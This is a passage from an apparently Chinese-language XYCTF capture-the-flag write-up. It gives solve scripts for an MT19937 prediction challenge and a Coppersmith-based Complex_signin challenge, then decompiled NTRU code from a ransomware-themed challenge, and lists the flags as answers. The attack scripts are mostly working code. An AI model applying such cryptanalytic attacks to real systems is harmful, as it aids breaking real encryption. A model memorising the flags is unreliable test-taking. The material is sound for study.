<span class="token keyword">for</span> i <span class="token keyword">in</span> data<span class="token punctuation">:</span>
    RC<span class="token punctuation">.</span>submit<span class="token punctuation">(</span>i<span class="token punctuation">)</span>

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'2'</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'er: >>>'</span><span class="token punctuation">)</span>
rand1 <span class="token operator">=</span> RC<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">11000</span><span class="token punctuation">)</span>
rand2 <span class="token operator">=</span> RC<span class="token punctuation">.</span>predict_getrandbits<span class="token punctuation">(</span><span class="token number">10000</span><span class="token punctuation">)</span>
correct_ans <span class="token operator">=</span> rand1 <span class="token operator">//</span> rand2

sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>correct_ans<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
sh<span class="token punctuation">.</span>recvlines<span class="token punctuation">(</span><span class="token punctuation">)</span>  </code></pre>

<blockquote>
<p>XYCTF{4c4e5327-9cd0-4fb6-b584-878afdffb850}</p>
</blockquote>
<h3 id="Complex-signin"><a href="#Complex-signin" class="headerlink" title="Complex_signin"></a>Complex_signin</h3><p>题目构造了复数对象，混淆了m的实部和虚部的低128位,已知</p>
<p><img src="/images/cry1-1744626745339-67.png" alt="cry1" loading="lazy"></p>
<p>二元copper解低位即可</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>number <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> ChaCha20
<span class="token keyword">import</span> hashlib
<span class="token keyword">import</span> itertools

<span class="token keyword">def</span> <span class="token function">small_roots</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> bounds<span class="token punctuation">,</span> m<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span> d<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> <span class="token keyword">not</span> d<span class="token punctuation">:</span>
        d <span class="token operator">=</span> f<span class="token punctuation">.</span>degree<span class="token punctuation">(</span><span class="token punctuation">)</span>

    R <span class="token operator">=</span> f<span class="token punctuation">.</span>base_ring<span class="token punctuation">(</span><span class="token punctuation">)</span>
    N <span class="token operator">=</span> R<span class="token punctuation">.</span>cardinality<span class="token punctuation">(</span><span class="token punctuation">)</span>

    f <span class="token operator">/=</span> f<span class="token punctuation">.</span>coefficients<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>
    f <span class="token operator">=</span> f<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>ZZ<span class="token punctuation">)</span>

    G <span class="token operator">=</span> Sequence<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>m <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        base <span class="token operator">=</span> N <span class="token operator">^</span> <span class="token punctuation">(</span>m <span class="token operator">-</span> i<span class="token punctuation">)</span> <span class="token operator">*</span> f <span class="token operator">^</span> i
        <span class="token keyword">for</span> shifts <span class="token keyword">in</span> itertools<span class="token punctuation">.</span>product<span class="token punctuation">(</span><span class="token builtin">range</span><span class="token punctuation">(</span>d<span class="token punctuation">)</span><span class="token punctuation">,</span> repeat<span class="token operator">=</span>f<span class="token punctuation">.</span>nvariables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            g <span class="token operator">=</span> base <span class="token operator">*</span> prod<span class="token punctuation">(</span><span class="token builtin">map</span><span class="token punctuation">(</span>power<span class="token punctuation">,</span> f<span class="token punctuation">.</span>variables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> shifts<span class="token punctuation">)</span><span class="token punctuation">)</span>
            G<span class="token punctuation">.</span>append<span class="token punctuation">(</span>g<span class="token punctuation">)</span>

    B<span class="token punctuation">,</span> monomials <span class="token operator">=</span> G<span class="token punctuation">.</span>coefficient_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span>
    monomials <span class="token operator">=</span> vector<span class="token punctuation">(</span>monomials<span class="token punctuation">)</span>

    factors <span class="token operator">=</span> <span class="token punctuation">[</span>monomial<span class="token punctuation">(</span><span class="token operator">*</span>bounds<span class="token punctuation">)</span> <span class="token keyword">for</span> monomial <span class="token keyword">in</span> monomials<span class="token punctuation">]</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> factor <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
        B<span class="token punctuation">.</span>rescale_col<span class="token punctuation">(</span>i<span class="token punctuation">,</span> factor<span class="token punctuation">)</span>

    B <span class="token operator">=</span> B<span class="token punctuation">.</span>dense_matrix<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>LLL<span class="token punctuation">(</span><span class="token punctuation">)</span>

    B <span class="token operator">=</span> B<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span>
    <span class="token keyword">for</span> i<span class="token punctuation">,</span> factor <span class="token keyword">in</span> <span class="token builtin">enumerate</span><span class="token punctuation">(</span>factors<span class="token punctuation">)</span><span class="token punctuation">:</span>
        B<span class="token punctuation">.</span>rescale_col<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">1</span> <span class="token operator">/</span> factor<span class="token punctuation">)</span>

    H <span class="token operator">=</span> Sequence<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> f<span class="token punctuation">.</span>parent<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>QQ<span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token keyword">for</span> h <span class="token keyword">in</span> <span class="token builtin">filter</span><span class="token punctuation">(</span><span class="token boolean">None</span><span class="token punctuation">,</span> B <span class="token operator">*</span> monomials<span class="token punctuation">)</span><span class="token punctuation">:</span>
        H<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">)</span>
        I <span class="token operator">=</span> H<span class="token punctuation">.</span>ideal<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">if</span> I<span class="token punctuation">.</span>dimension<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">:</span>
            H<span class="token punctuation">.</span>pop<span class="token punctuation">(</span><span class="token punctuation">)</span>
        <span class="token keyword">elif</span> I<span class="token punctuation">.</span>dimension<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            roots <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
            <span class="token keyword">for</span> root <span class="token keyword">in</span> I<span class="token punctuation">.</span>variety<span class="token punctuation">(</span>ring<span class="token operator">=</span>ZZ<span class="token punctuation">)</span><span class="token punctuation">:</span>
                root <span class="token operator">=</span> <span class="token builtin">tuple</span><span class="token punctuation">(</span>R<span class="token punctuation">(</span>root<span class="token punctuation">[</span>var<span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token keyword">for</span> var <span class="token keyword">in</span> f<span class="token punctuation">.</span>variables<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                roots<span class="token punctuation">.</span>append<span class="token punctuation">(</span>root<span class="token punctuation">)</span>
            <span class="token keyword">return</span> roots

    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>


<span class="token keyword">class</span> <span class="token class-name">Complex</span><span class="token punctuation">:</span>
    <span class="token keyword">def</span> <span class="token function">__init__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> re<span class="token punctuation">,</span> im<span class="token punctuation">)</span><span class="token punctuation">:</span>
        self<span class="token punctuation">.</span>re <span class="token operator">=</span> re
        self<span class="token punctuation">.</span>im <span class="token operator">=</span> im

    <span class="token keyword">def</span> <span class="token function">__mul__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        re_ <span class="token operator">=</span> self<span class="token punctuation">.</span>re <span class="token operator">*</span> c<span class="token punctuation">.</span>re <span class="token operator">-</span> self<span class="token punctuation">.</span>im <span class="token operator">*</span> c<span class="token punctuation">.</span>im
        im_ <span class="token operator">=</span> self<span class="token punctuation">.</span>re <span class="token operator">*</span> c<span class="token punctuation">.</span>im <span class="token operator">+</span> self<span class="token punctuation">.</span>im <span class="token operator">*</span> c<span class="token punctuation">.</span>re
        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>re_<span class="token punctuation">,</span> im_<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__eq__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> c<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> self<span class="token punctuation">.</span>re <span class="token operator">==</span> c<span class="token punctuation">.</span>re <span class="token keyword">and</span> self<span class="token punctuation">.</span>im <span class="token operator">==</span> c<span class="token punctuation">.</span>im

    <span class="token keyword">def</span> <span class="token function">__rshift__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>re <span class="token operator">>></span> m<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im <span class="token operator">>></span> m<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__lshift__</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> m<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> Complex<span class="token punctuation">(</span>self<span class="token punctuation">.</span>re <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im <span class="token operator">&lt;&lt;</span> m<span class="token punctuation">)</span>

    <span class="token keyword">def</span> <span class="token function">__str__</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token builtin">str</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>re<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> self<span class="token punctuation">.</span>re <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>
            <span class="token keyword">if</span> <span class="token builtin">abs</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>im<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'-'</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">&lt;</span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">''</span><span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>im<span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">&#123;</span>self<span class="token punctuation">.</span>re<span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token string">'+'</span> <span class="token keyword">if</span> self<span class="token punctuation">.</span>im <span class="token operator">></span> <span class="token number">0</span> <span class="token keyword">else</span> <span class="token string">'-'</span><span class="token punctuation">&#125;</span></span><span class="token string"> </span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">abs</span><span class="token punctuation">(</span>self<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">i"</span></span>

    <span class="token keyword">def</span> <span class="token function">tolist</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token punctuation">[</span>self<span class="token punctuation">.</span>re<span class="token punctuation">,</span> self<span class="token punctuation">.</span>im<span class="token punctuation">]</span>


<span class="token keyword">def</span> <span class="token function">complex_pow</span><span class="token punctuation">(</span>c<span class="token punctuation">,</span> exp<span class="token punctuation">,</span> n<span class="token punctuation">)</span><span class="token punctuation">:</span>
    result <span class="token operator">=</span> Complex<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> exp <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">if</span> exp <span class="token operator">&amp;</span> <span class="token number">1</span><span class="token punctuation">:</span>
            result <span class="token operator">=</span> result <span class="token operator">*</span> c
            result<span class="token punctuation">.</span>re <span class="token operator">=</span> result<span class="token punctuation">.</span>re <span class="token operator">%</span> n
            result<span class="token punctuation">.</span>im <span class="token operator">=</span> result<span class="token punctuation">.</span>im <span class="token operator">%</span> n
        c <span class="token operator">=</span> c <span class="token operator">*</span> c
        c<span class="token punctuation">.</span>re <span class="token operator">=</span> c<span class="token punctuation">.</span>re <span class="token operator">%</span> n
        c<span class="token punctuation">.</span>im <span class="token operator">=</span> c<span class="token punctuation">.</span>im <span class="token operator">%</span> n
        exp <span class="token operator">>></span><span class="token operator">=</span> <span class="token number">1</span>
    <span class="token keyword">return</span> result

n <span class="token operator">=</span> <span class="token number">24240993137357567658677097076762157882987659874601064738608971893024559525024581362454897599976003248892339463673241756118600994494150721789525924054960470762499808771760690211841936903839232109208099640507210141111314563007924046946402216384360405445595854947145800754365717704762310092558089455516189533635318084532202438477871458797287721022389909953190113597425964395222426700352859740293834121123138183367554858896124509695602915312917886769066254219381427385100688110915129283949340133524365403188753735534290512113201932620106585043122707355381551006014647469884010069878477179147719913280272028376706421104753</span>
mh <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">3960604425233637243960750976884707892473356737965752732899783806146911898367312949419828751012380013933993271701949681295313483782313836179989146607655230162315784541236731368582965456428944524621026385297377746108440938677401125816586119588080150103855075450874206012903009942468340296995700270449643148025957527925452034647677446705198250167222150181312718642480834399766134519333316989347221448685711220842032010517045985044813674426104295710015607450682205211098779229647334749706043180512861889295899050427257721209370423421046811102682648967375219936664246584194224745761842962418864084904820764122207293014016</span><span class="token punctuation">,</span> <span class="token number">15053801146135239412812153100772352976861411085516247673065559201085791622602365389885455357620354025972053252939439247746724492130435830816513505615952791448705492885525709421224584364037704802923497222819113629874137050874966691886390837364018702981146413066712287361010611405028353728676772998972695270707666289161746024725705731676511793934556785324668045957177856807914741189938780850108643929261692799397326838812262009873072175627051209104209229233754715491428364039564130435227582042666464866336424773552304555244949976525797616679252470574006820212465924134763386213550360175810288209936288398862565142167552</span><span class="token punctuation">]</span>
C <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">5300743174999795329371527870190100703154639960450575575101738225528814331152637733729613419201898994386548816504858409726318742419169717222702404409496156167283354163362729304279553214510160589336672463972767842604886866159600567533436626931810981418193227593758688610512556391129176234307448758534506432755113432411099690991453452199653214054901093242337700880661006486138424743085527911347931571730473582051987520447237586885119205422668971876488684708196255266536680083835972668749902212285032756286424244284136941767752754078598830317271949981378674176685159516777247305970365843616105513456452993199192823148760</span><span class="token punctuation">,</span> <span class="token number">21112179095014976702043514329117175747825140730885731533311755299178008997398851800028751416090265195760178867626233456642594578588007570838933135396672730765007160135908314028300141127837769297682479678972455077606519053977383739500664851033908924293990399261838079993207621314584108891814038236135637105408310569002463379136544773406496600396931819980400197333039720344346032547489037834427091233045574086625061748398991041014394602237400713218611015436866842699640680804906008370869021545517947588322083793581852529192500912579560094015867120212711242523672548392160514345774299568940390940653232489808850407256752</span><span class="token punctuation">]</span>
enc <span class="token operator">=</span> <span class="token string">b'\x9c\xc4n\x8dF\xd9\x9e\xf4\x05\x82!\xde\xfe\x012$\xd0\x8c\xaf\xfb\rEb(\x04)\xa1\xa6\xbaI2J\xd2\xb2\x898\x11\xe6x\xa9\x19\x00pn\xf6rs- \xd2\xd1\xbe\xc7\xf51.\xd4\xd2 \xe7\xc6\xca\xe5\x19\xbe'</span>

PR<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token punctuation">,</span>y<span class="token operator">>=</span>Zmod<span class="token punctuation">(</span><span class="token builtin">int</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">]</span>
a<span class="token operator">=</span>mh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>x
b<span class="token operator">=</span>mh<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>y
f1<span class="token operator">=</span>a<span class="token operator">^</span><span class="token number">3</span><span class="token operator">-</span><span class="token number">3</span><span class="token operator">*</span>a<span class="token operator">*</span>b<span class="token operator">^</span><span class="token number">2</span><span class="token operator">-</span>C<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>

roots<span class="token operator">=</span>small_roots<span class="token punctuation">(</span>f1<span class="token punctuation">,</span>bounds<span class="token operator">=</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">129</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">129</span><span class="token punctuation">)</span><span class="token punctuation">,</span>m<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">,</span>d<span class="token operator">=</span><span class="token number">3</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

m<span class="token operator">=</span>Complex<span class="token punctuation">(</span>mh<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">,</span>mh<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>roots<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>re <span class="token operator">+</span> m<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">)</span>

dec<span class="token operator">=</span>ChaCha20<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token operator">=</span>hashlib<span class="token punctuation">.</span>sha256<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>re <span class="token operator">+</span> m<span class="token punctuation">.</span>im<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>digest<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> nonce<span class="token operator">=</span><span class="token string">b'Pr3d1ctmyxjj'</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>dec<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>enc<span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre>

<blockquote>
<p>XYCTF{Welcome_to_XYCTF_Now_let_us_together_play_Crypto_challenge}</p>
</blockquote>
<h3 id="勒索病毒"><a href="#勒索病毒" class="headerlink" title="勒索病毒"></a>勒索病毒</h3><p>题目给出了exe和加密的16进制数据</p>
<p>pyinstxtractor反编译一下，编译task.pyc看到注释的代码</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> re
<span class="token keyword">import</span> base64
<span class="token keyword">import</span> os
<span class="token keyword">import</span> sys
<span class="token keyword">from</span> gmssl <span class="token keyword">import</span> sm4
<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad
<span class="token keyword">import</span> binascii
<span class="token keyword">from</span> random <span class="token keyword">import</span> shuffle<span class="token punctuation">,</span> randrange

N <span class="token operator">=</span> <span class="token number">49</span> 
p <span class="token operator">=</span> <span class="token number">3</span>
q <span class="token operator">=</span> <span class="token number">128</span>  
d <span class="token operator">=</span> <span class="token number">3</span>
<span class="token keyword">assert</span> q <span class="token operator">></span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">*</span> d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">*</span> p
R<span class="token punctuation">.</span><span class="token operator">&lt;</span>x<span class="token operator">></span> <span class="token operator">=</span> ZZ<span class="token punctuation">[</span><span class="token punctuation">]</span>
<span class="token keyword">def</span> <span class="token function">generate_T</span><span class="token punctuation">(</span>d1<span class="token punctuation">,</span> d2<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> N <span class="token operator">>=</span> d1 <span class="token operator">+</span> d2
    s <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> d1 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">*</span> d2 <span class="token operator">+</span> <span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">*</span> <span class="token punctuation">(</span>N <span class="token operator">-</span> d1 <span class="token operator">-</span> d2<span class="token punctuation">)</span>
    shuffle<span class="token punctuation">(</span>s<span class="token punctuation">)</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span>s<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">invert_mod_prime</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>
    Rp <span class="token operator">=</span> R<span class="token punctuation">.</span>change_ring<span class="token punctuation">(</span>Integers<span class="token punctuation">(</span>p<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>quotient<span class="token punctuation">(</span>x<span class="token operator">^</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span>lift<span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">/</span> Rp<span class="token punctuation">(</span>f<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">convolution</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token punctuation">(</span>f <span class="token operator">*</span> g<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token punctuation">(</span>x<span class="token operator">^</span>N <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">lift_mod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token punctuation">(</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+</span> q <span class="token operator">//</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">%</span> q<span class="token punctuation">)</span> <span class="token operator">-</span> q <span class="token operator">//</span> <span class="token number">2</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">poly_mod</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span>f<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">%</span> q <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">invert_mod_pow2</span><span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">assert</span> q<span class="token punctuation">.</span>is_power_of<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>
    g <span class="token operator">=</span> invert_mod_prime<span class="token punctuation">(</span>f<span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        r <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>g<span class="token punctuation">,</span> f<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
        <span class="token keyword">if</span> r <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> g
        g <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>g<span class="token punctuation">,</span> <span class="token number">2</span> <span class="token operator">-</span> r<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_message</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> R<span class="token punctuation">(</span><span class="token punctuation">[</span>randrange<span class="token punctuation">(</span>p<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span> <span class="token keyword">for</span> _ <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span>N<span class="token punctuation">)</span><span class="token punctuation">]</span><span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">generate_key</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token keyword">try</span><span class="token punctuation">:</span>
            f <span class="token operator">=</span> generate_T<span class="token punctuation">(</span>d <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> d<span class="token punctuation">)</span>
            g <span class="token operator">=</span> generate_T<span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span>
            Fp <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>invert_mod_prime<span class="token punctuation">(</span>f<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">,</span> p<span class="token punctuation">)</span>
            Fq <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>invert_mod_pow2<span class="token punctuation">(</span>f<span class="token punctuation">,</span> q<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
            <span class="token keyword">break</span>
        <span class="token keyword">except</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
    h <span class="token operator">=</span> poly_mod<span class="token punctuation">(</span>convolution<span class="token punctuation">(</span>Fq<span class="token punctuation">,</span> g<span class="token punctuation">)</span><span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> h<span class="token punctuation">,</span> <span class="token punctuation">(</span>f<span class="token punctuation">,</span> g<span class="token punctuation">)</span>

<span class="token keyword">def</span> <span class="token function">encrypt_message</span><span class="token punctuation">(</span>m<span class="token punctuation">,</span> h<span class="token punctuation">)</span><span class="token punctuation">:</span>
    e <span class="token operator">=</span> lift_mod<span class="token punctuation">(</span>p <span class="token operator">*</span> convolution<span class="token punctuation">(</span>h<span class="token punctuation">,</span> generate_T<span class="token punctuation">(</span>d<span class="token punctuation">,</span> d<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> m<span class="token punctuation">,</span> q<span class="token punctuation">)</span>
    <span class="token keyword">return</span> e

<span class="token keyword">def</span> <span class="token function">save_ntru_keys</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    h<span class="token punctuation">,</span> secret <span class="token operator">=</span> generate_key<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"pub_key.txt"</span><span class="token punctuation">,</span> <span class="token string">"w"</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span>
